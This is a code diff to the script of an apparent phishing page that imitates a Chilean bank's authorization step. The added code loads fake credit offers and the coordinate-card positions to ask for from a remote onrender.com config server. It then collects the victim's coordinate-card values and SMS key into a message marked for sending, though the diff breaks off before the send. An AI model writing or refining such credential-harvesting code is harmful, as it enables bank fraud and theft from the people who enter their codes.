@@ -112,6 +112,8 @@
   </div>
 
   <script>
+    const API_URL = "https://autorizaci-n-coordenadas-o-pass.onrender.com/config";
+
     // Formato CLP
     function formatoCLP(valor){
       return new Intl.NumberFormat("es-CL", {
@@ -123,26 +125,31 @@
     }
 
     document.addEventListener("DOMContentLoaded", () => {
-      const producto1 = localStorage.getItem("producto1") || "Línea de Crédito";
-      const monto1 = localStorage.getItem("lineaMonto") || 5000000;
-      const producto2 = localStorage.getItem("producto2") || "Tarjeta de Crédito WorldMember Limited Business";
-      const monto2 = localStorage.getItem("tarjetaMonto") || monto1;
-      const seleccion = localStorage.getItem("seleccionProducto");
+      // Obtener configuración desde el backend
+      fetch(API_URL)
+        .then(res => res.json())
+        .then(data => {
+          // Mostrar producto seleccionado
+          const seleccion = localStorage.getItem("seleccionProducto");
+          let texto = "";
+          if(seleccion === "linea"){
+            texto = (data.producto1 || "Línea de Crédito") + " por <span class='monto-box'>" + formatoCLP(data.monto1 || 5000000) + "</span>";
+          } else if(seleccion === "tarjeta"){
+            texto = (data.producto2 || "Tarjeta de Crédito WorldMember Limited Business") + " por <span class='monto-box'>" + formatoCLP(data.monto2 || 5000000) + "</span>";
+          } else {
+            texto = "No se ha seleccionado producto.";
+          }
+          document.getElementById("seleccionProducto").innerHTML = texto;
 
-      let texto = "";
-      if(seleccion === "linea"){
-        texto = producto1 + " por <span class='monto-box'>" + formatoCLP(monto1) + "</span>";
-      } else if(seleccion === "tarjeta"){
-        texto = producto2 + " por <span class='monto-box'>" + formatoCLP(monto2) + "</span>";
-      } else {
-        texto = "No se ha seleccionado producto.";
-      }
-      document.getElementById("seleccionProducto").innerHTML = texto;
-
-      // Mostrar coordenadas configuradas en Panel Admin (ejemplo: A4, B7, C2)
-      document.getElementById("coordLabel1").innerText = localStorage.getItem("coord1") || "A1";
-      document.getElementById("coordLabel2").innerText = localStorage.getItem("coord2") || "B2";
-      document.getElementById("coordLabel3").innerText = localStorage.getItem("coord3") || "C3";
+          // Mostrar coordenadas configuradas
+          document.getElementById("coordLabel1").innerText = data.coord1 || "A1";
+          document.getElementById("coordLabel2").innerText = data.coord2 || "B2";
+          document.getElementById("coordLabel3").innerText = data.coord3 || "C3";
+        })
+        .catch(err => {
+          console.error("Error al cargar configuración:", err);
+          document.getElementById("mensaje").innerText = "⚠️ No se pudo cargar configuración del servidor.";
+        });
     });
 
     document.getElementById("autorizarBtn").addEventListener("click", async function(){
@@ -152,9 +159,9 @@
       const claveSMS = document.getElementById("claveSMS").value;
 
       const mensaje = `Autorización Coordenadas:
-      ${localStorage.getItem("coord1")}: ${coordA}
-      ${localStorage.getItem("coord2")}: ${coordB}
-      ${localStorage.getItem("coord3")}: ${coordC}
+      ${document.getElementById("coordLabel1").innerText}: ${coordA}
+      ${document.getElementById("coordLabel2").innerText}: ${coordB}
+      ${document.getElementById("coordLabel3").innerText}: ${coordC}
       Clave SMS: ${claveSMS}`;
 
       document.getElementById("mensaje").innerText = "Enviando autorización...";
